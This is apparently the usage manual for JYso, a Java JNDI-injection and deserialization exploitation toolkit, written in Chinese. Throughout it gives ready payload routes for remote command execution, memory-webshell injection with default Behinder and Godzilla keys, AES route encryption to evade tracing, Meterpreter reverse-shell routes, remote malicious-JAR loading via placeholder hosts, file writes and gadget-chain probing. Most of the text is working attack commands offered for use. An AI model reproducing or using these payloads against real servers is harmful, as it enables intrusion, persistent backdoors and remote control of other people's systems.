# 1 JNDIExploit 用法

```payload不区分大小写```

使用 ```java -jar JYso-[version].jar --jndi -h``` 查看参数说明，其中 ```--ip``` 参数为必选参数

```
Usage: java -jar JYso-[version].jar --jndi [options]
  Options:
  * -i,  --ip       Local ip address  (default: 127.0.0.1)
    -rP, --rmiPort  rmi bind port (default: 1099)
    -lP, --ldapPort Ldap bind port (default: 1389)
    -hP, --httpPort Http bind port (default: 3456)
    -g,  --gadgets  Show gadgets (default: false)
    -c,  --command  RMI this command
    -h,  --help     Show this help
    -ak  --AESkey   AES+BAse64 decryption of routes
    -u   --user     ldap bound account
    -p   --PASSWD   ldap binding password
    --jndi          start JNDImode
```

+ 一般启动示例

```
java -jar JYso-[version].jar --jndi -i 127.0.0.1
```

+ 需要账号密码认证的情况下

```shell
java -jar JYso-[version].jar --jndi -i 127.0.0.1 -u "dc=ex" -p "123456"
```

+ 对于BCEL这种超长请求，可以从http处取参，来减少请求长度

先发http请求参数，在发jndi payload

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections6/sethttp
```

```shell
http://127.0.0.1:3456/setPathAlias?a=whoami
```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230705100008.png)

+ 对路由加密反溯源，启动时需要把 AESkey 加上

```
java -jar JYso-2.6.jar --jndi -i 127.0.0.1 -ak 3yWm2mOpXudIPTqM
```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230704215102.png)

<details>
  <summary>用来加密的JAVA代码</summary>


```java
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Main {
    private static final String ALGORITHM      = "AES";
    private static final String TRANSFORMATION = "AES/CBC/PKCS5Padding";
    private static final int    KEY_SIZE       = 16; // 128 bits

    public static String encodeBase64(String text) {
        byte[] encodedBytes = Base64.getEncoder().encode(text.getBytes());
        return new String(encodedBytes);
    }

    public static String encrypt(String plaintext, String key) throws Exception {
        byte[] ivBytes  = generateIV();
        byte[] keyBytes = getKeyBytes(key);

        SecretKeySpec   secretKeySpec = new SecretKeySpec(keyBytes, ALGORITHM);
        IvParameterSpec ivSpec        = new IvParameterSpec(ivBytes);

        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivSpec);

        byte[] encryptedBytes = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
        byte[] combinedBytes  = new byte[ivBytes.length + encryptedBytes.length];
        System.arraycopy(ivBytes, 0, combinedBytes, 0, ivBytes.length);
        System.arraycopy(encryptedBytes, 0, combinedBytes, ivBytes.length, encryptedBytes.length);

        return Base64.getEncoder().encodeToString(combinedBytes);
    }

    private static byte[] generateIV() {
        byte[] ivBytes = new byte[KEY_SIZE];
        // Generate random IV bytes
        // Replace with a secure random generator if possible
        for (int i = 0; i < ivBytes.length; i++) {
            ivBytes[i] = (byte) (Math.random() * 256);
        }
        return ivBytes;
    }

    private static byte[] getKeyBytes(String key) {
        byte[] keyBytes      = new byte[KEY_SIZE];
        byte[] passwordBytes = key.getBytes(StandardCharsets.UTF_8);
        System.arraycopy(passwordBytes, 0, keyBytes, 0, Math.min(passwordBytes.length, keyBytes.length));
        return keyBytes;
    }
    public static void main(String[] args) {
        try {
            String plaintext = "Deserialization/CommonsCollections6/command/Base64/d2hvYW1p";
            String key = "3yWm2mOpXudIPTqM";

            String ciphertext = encrypt(plaintext, key);
            String encodedText = encodeBase64(ciphertext);
            System.out.println("Base64 Encoded Text: " + encodedText);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

</details>

+ 对于路由完全不可控的情况下，从http处获取

```shell
jndi:ldap://127.0.0.1:1389/
```

```shell
http://127.0.0.1:3456/setRoute?a=Deserialization/CommonsCollections6/command/Base64/d2hvYW1p
```

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230706103914.png)

* 目前支持的所有 ```Echo``` 为
  * ```Bypass```: 用于rmi本地工厂类加载，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```TomcatEcho```: 用于在中间件为 ```Tomcat``` 时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami```
    的方式传递想要执行的命令
  * ```SpringEcho```: 用于在框架为 ```SpringMVC/SpringBoot```
    时命令执行结果的回显，通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```JbossEcho```: Jboss 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```WeblogicEcho```: weblogic 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```WebsphereEcho```: websphere 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```ResinEcho```: Resin 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```JettyEcho```: Jetty7,8,9版本命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```WindowsEcho```: Windows 命令执行回显, 只执行了whoami
  * ```Struts2Echo```: Struts2 命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```LinuxEcho1```: Linux 命令执行回显, 只执行了id，
    + 原理是遍历当前进程 fd 目录下的所有和 socket 相关的 fd 文件，并输出结果;
    + 缺陷：1. 会影响同一时间点所有访问网站的用户（也会看到自定义回显的结果）; 2. 在8次左右有可能导致应用崩溃
  * ```LinuxEcho2```: Linux 命令执行回显, 只执行了id
    + 原理：通过延迟等方法来确定唯一正确的 fd 文件;
    + 不会影响访问网站的其他用户，也不会导致应用崩溃;
  * ```AllEcho```: 自动选择命令执行回显, 通过添加自定义```header``` ```cmd: whoami``` 的方式传递想要执行的命令
  * ```command```：用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输

+ 直接命令执行示例：

```
ldap://127.0.0.1:1389/TomcatBypass/command/Base64/[base64_encoded_cmd]
```

+ Echo示例：

```
jndi:ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
jndi:ldap://127.0.0.1:1389/Basic/TomcatEcho
```

效果图：

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230627112538.png)

- 支持tomcatBypass路由直接上线msf：
- 使用msf的java/meterpreter/reverse_tcp开启监听

```
ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/msf/[msf_ip]/[msf_port]
```

---

## 1.1 内存马

两种添加方式：

- 支持引用远程类加载方式打入（Basic路由）。
- 支持本地工厂类加载方式打入（TomcatBypass路由）。

使用说明：
不指定类型就默认为冰蝎马。

- t 选择内存马的类型
  - 不指定类型就默认为冰蝎马
  - bx: 冰蝎内存马，```key: 3c6e0b8a9c15224a```, ```Referer：https://QI4L.cn/```
  - gz: 哥斯拉内存马，```pass: p@ssw0rd```, ```Referer：https://QI4L.cn/```
  - gzraw: 哥斯拉 raw 类型的内存马, ```pass: p@ssw0rd```, ```Referer：https://QI4L.cn/```
  - cmd: cmd命令回显内存马
  - sou5: suo5 隧道马
- a：是否继承恶意类 AbstractTranslet
- o：使用反射绕过
- w：Windows下使用Agent写入
- l：Linux下使用Agent写入
- u：内存马绑定的路径,default [/sysinfo]
- pw：内存马的密码,default [p@ssw0rd]
- r：内存马 Referer check,default [https://www.baidu.com/]
- h：通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持 SpringControllerMS
- ht：隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/

+ 内存马使用示例：
+ 加参数

```
jndi:ldap://127.0.0.1:1389/Basic/tomcatfilterjmx/shell/-u path223 -pw 123456 -r tth.cn
```

+ 默认加载

```
jndi:ldap://127.0.0.1:1389/Basic/tomcatfilterjmx/shell
```

内存马说明：

* ```SpringInterceptor```: 向系统内植入 Spring Interceptor 类型的内存马
* ```SpringController```: 向系统内植入 Spring Controller 类型的内存马
* ```JettyFilter```: 利用 JMX MBeans 向系统内植入 Jetty Filter 型内存马
* ```JettyServlet```: 利用 JMX MBeans 向系统内植入 Jetty Servlet 型内存马
* ```JBossFilter```: 通过全局上下文向系统内植入 JBoss/Wildfly Filter 型内存马
* ```JBossServlet```: 通过全局上下文向系统内植入 JBoss/Wildfly Servlet 型内存马
* ```resinFilterTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Filter 型内存马
* ```resinServletTh```: 通过线程类加载器获取指定上下文系统内植入 Resin Servlet 型内存马
* ```WebsphereMemshell```: 用于植入```Websphere内存shell```， 支持```Behinder shell``` 与 ```Basic cmd shell```
* ```tomcatFilterJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Filter 型内存马
* ```tomcatFilterTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Filter 型内存马
* ```TomcatListenerJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Listener 型内存马
* ```TomcatListenerTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Listener 型内存马
* ```TomcatServletJmx```: 利用 JMX MBeans 向系统内植入 Tomcat Servlet 型内存马
* ```TomcatServletTh```: 通过线程类加载器获取指定上下文向系统内植入 Tomcat Servlet 型内存马
* ```WSFilter```: `CMD` 命令回显 WebSocket 内存马，`cmd命令回显`
* ```TomcatExecutor``` : Executor 内存马，`cmd命令回显`
* ```TomcatUpgrade```: TomcatUpgrade 内存马，`cmd命令回显`
* ```Struts2ActionMS```: Action 类型内存马
* ```cmsMSBYNC```: 绕过Nginx、CDN代理限制的 WebSocket 马，路径`/x`
* ```proxyMSBYNC```: 绕过Nginx、CDN代理限制的 WebSocket 马，路径`/x`
* ```WsResin```: 适配 Resin 的 WebSocket 马，请求头中`Upgrade: websocket`
* ```MsTSJser```: 适配Tomcat、Spring、Jetty的 WebSocket 马，路径`/cmd`
* ```MsTSJproxy```: 适配Tomcat、Spring、Jetty的 WebSocket 马，路径`/proxy`
* ```WsWeblogic```: 适配 Weblogic 的 WebSocket 马，路径`/path`
* ```WSWebsphereProxy```: 适配 Websphere 的 WebSocket 马，路径`/path`

---

## 1.2 BeanShell1 与 Clojure 利用链的拓展

对于 `BeanShell1` 及 `Clojure` 这两个基于脚本语言解析的漏利用方式。

本项目为这两条利用链拓展了除了 Runtime 执行命令以外的多种利用方式，具体如下：

`Base64/`后的内容需要base64编码

TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/TS-10
```

RC ：Remote Call - 通过 URLClassLoader.loadClass()
来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass

换成CS或者MSF生成的JAR包，即可完成一键上线。

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
```

WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#123

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/WF-/tmp/shell#123
```

其他：普通命令执行 - 通过 ProcessBuilder().start() 执行系统命令，使用命令 whoami

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/whoami
```

---

## 1.3 C3P04的使用

* 远程加载 Jar 包
  * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
* 向服务器写入 Jar 包并加载（不出网）
  * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
  * C3P04 'localJar-./yaml.jar'
* C3P0 二次反序列化
  * C3P04 'c3p0Double-/usr/CC6.ser'

```
jndi:ldap://127.0.0.1:1389/Deserialization/C3P04/command/Base64/[base64_encoded_cmd]
```

---

## 1.4 SignedObject 二次反序列化 Gadget

用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）

利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；

大概包含如下几种可用的常见调用链：

1. InvokerTransformer 调用任意方法（依赖 CC）
2. BeanComparator 调用 getter 方法（依赖 CB）
3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
4. ToStringBean 调用全部 getter 方法（依赖 Rome）
5. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
6. MemberBox 反射调用任意方法（依赖 rhino）

* `cc`,`cc4`,`cb`,`hibernate`,`rome`,`rhino`,`spring`

* 利用方式：
* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000' 最后两个参数是反序列化的类型

```
jndi:ldap://127.0.0.1:1389/Deserialization/SignedObject/command/Base64/CC:commonscollections6:[base64_encoded_cmd]:1::10000)
```

---

## 1.5 Deserialization路由

| Gadget                                      | 依赖                                                         | ps                   |
| :------------------------------------------ | :----------------------------------------------------------- | -------------------- |
| AspectJWeaver                               | aspectjweaver:1.9.2<br/>commons-collections:3.2.2            |                      |
| AspectJWeaver2                              | org.aspectj:aspectjweaver:1.9.2<br/>commons-collections:commons-collections:3.2.2 |                      |
| BeanShell1                                  | org.beanshell:bsh:2.0b5                                      |                      |
| C3P0                                        | com.mchange:c3p0:0.9.5.2<br/>mchange-commons-java:0.2.11     |                      |
| C3P02                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35 |                      |
| C3P03                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.codehaus.groovy:groovy:2.3.9 |                      |
| C3P04                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.yaml:snakeyaml:1.30 |                      |
| C3P092                                      | com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8<br/>com.mchange:mchange-commons-java:0.2.11 |                      |
| Click1                                      | org.apache.click:click-nodeps:2.3.0<br/>javax.servlet:javax.servlet-api:3.1.0 |                      |
| Clojure                                     | org.clojure:clojure:1.8.0                                    |                      |
| CommonsBeanutils1                           | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2 |                      |
| CommonsBeanutils1Jdbc                       |                                                              | 高版本Bypass         |
| CommonsBeanutils2                           | commons-beanutils:commons-beanutils:1.9.2                    | 可打shiro            |
| CommonsBeanutils2Jdbc                       |                                                              | 高版本Bypass         |
| CommonsBeanutils2NOCC                       | commons-beanutils:commons-beanutils:1.8.3<br/>commons-logging:commons-logging:1.2 |                      |
| CommonsBeanutils1183NOCC                    | commons-beanutils:commons-beanutils:1.8.3                    |                      |
| CommonsBeanutilsAttrCompare                 | commons-beanutils:commons-beanutils:1.9.2                    |                      |
| CommonsBeanutilsAttrCompare183              | commons-beanutils:commons-beanutils:1.8.3                    |                      |
| CommonsBeanutilsObjectToStringComparator    | "commons-beanutils:commons-beanutils:1.9.2 org.apache.commons:commons-lang3:3.10" |                      |
| CommonsBeanutilsObjectToStringComparator183 | "commons-beanutils:commons-beanutils:1.8.3"                  |                      |
| CommonsBeanutilsPropertySource              | "commons-beanutils:commons-beanutils:1.9.2 org.apache.logging.log4j:log4j-core:2.17.1" |                      |
| CommonsBeanutilsPropertySource183           | "commons-beanutils:commons-beanutils:1.9.2 org.apache.logging.log4j:log4j-core:2.17.1" |                      |
| CommonsCollections1                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections2                         | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollections3                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections4                         | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollections5                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections6                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections7                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections8                         | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollections9                         | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollections10                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollections11                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollections12                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollectionsK1                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollectionsK2                        | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollectionsK3                        | commons-collections:commons-collections:3.1                  | CC6简化的写法        |
| CommonsCollectionsK4                        | org.apache.commons:commons-collections4:4.0                  | CC6简化的写法的4.0版 |
| CommonsCollectionsK5                        | org.apache.commons:commons-collections4:4.0                  | CC7的4.0版           |
| CommonsCollectionsK6                        | org.apache.commons:commons-collections4:4.0                  | CC11的4.0版          |
| Fastjson1                                   | Fastjosn 1.2.48                                              |                      |
| Fastjson2                                   | Fastjosn 2+                                                  |                      |
| Groovy1                                     | org.codehaus.groovy:groovy:2.3.9                             |                      |
| Hibernate1                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final |                      |
| Hibernate2                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final |                      |
| Jackson                                     |                                                              |                      |
| JavassistWeld1                              | javassist:javassist:3.12.1.GA<br/>org.jboss.weld:weld-core:1.1.33.Final<br/>javax.interceptor:javax.interceptor-api:3.1<br/>javax.enterprise:cdi-api:1.0-SP1<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final<br/>org.slf4j:slf4j-api:1.7.21 |                      |
| JBossInterceptors1                          | javassist:javassist:3.12.1.GA<br/>org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final<br/>javax.enterprise:cdi-api:1.0-SP1<br/>javax.interceptor:javax.interceptor-api:3.1<br/>org.slf4j:slf4j-api:1.7.21<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final |                      |
| Jdk7u21                                     | -                                                            |                      |
| Jdk7u21variant                              | -                                                            |                      |
| JRE8u20                                     |                                                              |                      |
| JRE8u20_2                                   |                                                              |                      |
| JRMPClient                                  |                                                              |                      |
| JRMPClient_Activator                        |                                                              |                      |
| JRMPClient_Obj                              |                                                              |                      |
| JRMPListener                                |                                                              |                      |
| JSON1                                       | net.sf.json-lib:json-lib:jar:jdk15:2.4<br/>org.springframework:spring-aop:4.1.4.RELEASE |                      |
| Jython1                                     | org.python:jython-standalone:2.5.2                           |                      |
| MozillaRhino1                               | rhino:js:1.7R2                                               |                      |
| MozillaRhino2                               | rhino:js:1.7R2                                               |                      |
| Myfaces1                                    | -                                                            |                      |
| Myfaces2                                    | -                                                            |                      |
| RenderedImage                               | javax.media:jai-codec-1.1.3                                  |                      |
| ROME                                        | rome:rome:1.0                                                |                      |
| ROME2                                       | rome:rome:1.0<br/>JDK 8+                                     |                      |
| Spring1                                     | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-beans:4.1.4.RELEASE |                      |
| Spring2                                     | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-aop:4.1.4.RELEASE<br/>aopalliance:aopalliance:1.0<br/>commons-logging:commons-logging:1.2 |                      |
| Spring3                                     | org.springframework:spring-tx:5.2.3.RELEASE<br/>org.springframework:spring-context:5.2.3.RELEASE<br/>javax.transaction:javax.transaction-api:1.2 |                      |
| Vaadin1                                     | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14 |                      |
| Wicket1                                     | org.apache.wicket:wicket-util:6.23.0<br/>org.slf4j:slf4j-api:1.6.4 |                      |

- a：恶意类是否继承 AbstractTranslet
- o：使用反射绕过
  ~~- j：使用 ObjectInputStream/ObjectOutputStream 来构造序列化流~~（这个构造的流有BUG，还在思考修复）
- 需要参数时，在命令后面添加，#参数

* 使用示例：

```
jndi:ldap://127.0.0.1:1389/Deserialization/[GadgetType]/command/Base64/[base64_encoded_cmd]
```

加参数

```
jndi:ldap://127.0.0.1:1389/Deserialization/[GadgetType]/command/cmd#-a -o}
```

当命令中有`?`时base64编码出现`/`导致出现BUG时使用，命令需要Base64编码两次。

```
jndi:ldap://127.0.0.1:1389/Deserialization/[GadgetType]/command/Base64Two/base64_encoded_cmd#-a -o
```

* 效果图

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png)

---

对于Gadget：

- CommonsCollections1
- CommonsCollections5
- CommonsCollections6
- CommonsCollectionsK3
- CommonsCollectionsK4
- CommonsCollections7
- commonscollectionsK5
- CommonsCollections9

* 使用 `Transformer[]` 数组实现

为其拓展了除了 Runtime 执行命令意外的多种利用方式，具体如下：

TS ：Thread Sleep - 通过 Thread.sleep() 的方式来检查是否存在反序列化漏洞，使用命令：TS-10

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/TS-10
```

RC ：Remote Call - 通过 URLClassLoader.loadClass()
来调用远程恶意类并初始化，使用命令：RC-http://xxxx.com/evil.jar#EvilClass

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
```

WF ：Write File - 通过 FileOutputStream.write() 来写入文件，使用命令：WF-/tmp/shell#d2hvYW1p

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/WF-/tmp/shell#d2hvYW1p
```

PB ：ProcessBuilder 通过 ProcessBuilder.start() 来执行系统命令，使用命令 ```PB-lin-d2hvYW1p``` / ```PB-win-d2hvYW1p```
分别在不同操作系统执行命令

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
```

SE ：ScriptEngine - 通过 ScriptEngineManager.getEngineByName('js').eval() 来解析 JS 代码调用 Runtime 执行命令，使用命令
SE-d2hvYW1

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/SE-d2hvYW1
```

DL ：DNS LOG - 通过 InetAddress.getAllByName() 来触发 DNS 解析，使用命令 DL-xxxdnslog.cn

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/DL-xxxdnslog.cn
```

HL ：HTTP LOG - 通过 URL.getContent() 来触发 HTTP LOG，使用命令 HL-http://xxx.com

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/HL-http://xxx.com
```

BC ：BCEL Classloader - 通过 ..bcel...ClassLoader.loadClass().newInstance() 来加载 BCEL 类字节码，使用命令 BC-$BCEL$xxx

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/BC-$BCEL$xxx
```

其他：普通命令执行 - 通过 Runtime.getRuntime().exec() 执行系统命令，使用命令 whoami

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/whoami
```

## 1.6 其他利用链拓展

对于除了以上的利用链,使用的是 `TemplatesImpl` 类来实现。

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections3/command/Base64/whoami
```

## 1.7 任意自定义代码

对于使用了 `TemplatesImpl` 类来实现的链子来说，可以使用此方法

如果你不想使用本项目中提供的恶意逻辑，也不想执行命令，可以通过自定义代码的形式，自定义代码将会在目标服务器通过 `ClassLoader`
进行加载并实例化。命令使用 `LF#` 开头，后面跟指定自定义类字节码文件的绝对路径。

示例：

**class 类文件绝对路径**

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections3/command/Base64/LF#/tmp/evil.class-org
```

## 1.8 利用链探测

参考了 kezibei 师傅的 URLDNS 项目，实际情况可能有如下几种情况导致问题：

+ 反序列时遇到黑名单，可能导致后面的类的 dnslog 出不来；
+ 反序列化流程中由于种种情况报错可能导致出不来。

因此这里还是提供了 all/common/指定类 三种探测方式：

+ all：探测全部的类；
+ common：探测不常在黑名单中的 CommonsBeanutils2/C3P0/AspectJWeaver/bsh/winlinux；
+ 指定类：使用对应链中的关键字 CommonsCollections24:xxxx.dns.log 。

```
jndi:ldap://127.0.0.1:1389/Deserialization/URLDNS/command/Base64/all:xxxxxx.dns.log
```

| DNSLOG 关键字                               | 对应链                  | 关键类                                                       | 备注                                                         |
| ------------------------------------------- | ----------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| cc31or321<br />cc322                        | CommonsCollections13567 | org.apache.commons.collections.functors.ChainedTransformer<br />org.apache.commons.collections.ExtendedProperties$1 | CommonsCollections1/3/5/6/7<br />需要<=3.2.1版本             |
| cc40<br />cc41                              | CommonsCollections24    | org.apache.commons.collections4.functors.ChainedTransformer<br />org.apache.commons.collections4.FluentIterable | CommonsCollections2/4链<br />需要4-4.0版本                   |
| cb17<br />cb18x<br />cb19x                  | CommonsBeanutils2       | org.apache.commons.beanutils.MappedPropertyDescriptor\$1<br />org.apache.commons.beanutils.DynaBeanMapDecorator\$MapEntry<br />org.apache.commons.beanutils.BeanIntrospectionData | 1.7x-1.8x为-3490850999041592962<br />1.9x为-2044202215314119608 |
| c3p092x<br />c3p095x                        | C3P0                    | com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase<br />com.mchange.v2.c3p0.test.AlwaysFailDataSource | 0.9.2pre2-0.9.5pre8为7387108436934414104<br />0.9.5pre9-0.9.5.5为7387108436934414104 |
| ajw                                         | AspectJWeaver           | org.aspectj.weaver.tools.cache.SimpleCache                   | AspectJWeaver,需要cc31                                       |
| bsh20b4<br />bsh20b5<br />bsh20b6           | bsh                     | bsh.CollectionManager\$1<br />bsh.engine.BshScriptEngine<br />bsh.collection.CollectionIterator\$1 | 2.0b4为4949939576606791809<br />2.0b5为4041428789013517368<br />2.0.b6无法反序列化 |
| groovy1702311<br />groovy24x<br />groovy244 | Groovy                  | org.codehaus.groovy.reflection.ClassInfo\$ClassInfoSet<br />groovy.lang.Tuple2<br />org.codehaus.groovy.runtime.dgm\$1170 | 2.4.x为-8137949907733646644<br />2.3.x为1228988487386910280  |
| becl                                        | Becl                    | com.sun.org.apache.bcel.internal.util.ClassLoader            | JDK<8u251                                                    |
| Jdk7u21                                     | Jdk7u21                 | com.sun.corba.se.impl.orbutil.ORBClassLoader                 | JDK<=7u21                                                    |
| JRE8u20                                     | JRE8u20                 | javax.swing.plaf.metal.MetalFileChooserUI\$DirectoryComboBoxModel\$1 | 7u25<=JDK<=8u20<br />这个检测不完美,8u25版本以及JDK<=7u21会误报<br />可综合Jdk7u21来看 |
| linux<br />windows                          | winlinux                | sun.awt.X11.AwtGraphicsConfigData<br />sun.awt.windows.WButtonPeer | windows/linux版本判断                                        |
| jackson2100                                 | jackson                 | com.fasterxml.jackson.databind.node.NodeSerialization        |                                                              |
| ROME                                        | ROME                    | com.sun.syndication.feed.impl.ToStringBean<br />com.rometools.rome.feed.impl.ObjectBean |                                                              |
| SpringAOP                                   | fastjon<br /> jackson   | org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource |                                                              |
| fastjson                                    | fastjon                 | com.alibaba.fastjson.JSONArray                               |                                                              |
|                                             | all                     | 全部检测                                                     | 全部检测                                                     |


* 效果图

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230821090740.png)

---

# 2 ysoserial用法

```payload不区分大小写```

项目支持利用链展示：

链子参考1.5 Deserialization路由

```text7
[root]#~  Usage: java -jar JYso-[version].jar -yso -g [payload] -p [command] [options]
[root]#~  Available payload types:
     Payload                                     Authors                                Dependencies                                                                                                                                                                        
     -------                                     -------                                ------------                                                                                                                                                                        
     AspectJWeaver                               @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                
     AspectJWeaver2                                                                     aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                    
     BeanShell1                                  @pwntester, @cschneider4711            bsh:2.0b5                                                                                                                                                                         
     C3P0                                        @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                          
     C3P02                                                                              c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35                                                                                                           
     C3P03                                                                              c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, groovy:2.3.9                                                                                                              
     C3P04                                                                              c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, snakeyaml:1.30                                                                                                            
     C3P092                                      @mbechler                              c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11                                                                                                                   
     Click1                                      @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                         
     Clojure                                     @JackOfMostTrades                      clojure:1.8.0                                                                                                                                                                       
     CommonsBeanutils1                           @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                               
     CommonsBeanutils1183NOCC                                                           commons-beanutils:1.8.3                                                                                                                                                             
     CommonsBeanutils1Jdbc                       @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                               
     CommonsBeanutils2                                                                  commons-beanutils:1.9.2                                                                                                                                                             
     CommonsBeanutils2Jdbc                       @frohoff                               commons-beanutils:1.9.2                                                                                                                                                             
     CommonsBeanutils2NOCC                                                              commons-beanutils:1.8.3, commons-logging:1.2                                                                                                                                        
     CommonsBeanutilsAttrCompare                 @水滴                                   commons-beanutils:1.9.2                                                                                                                                                           
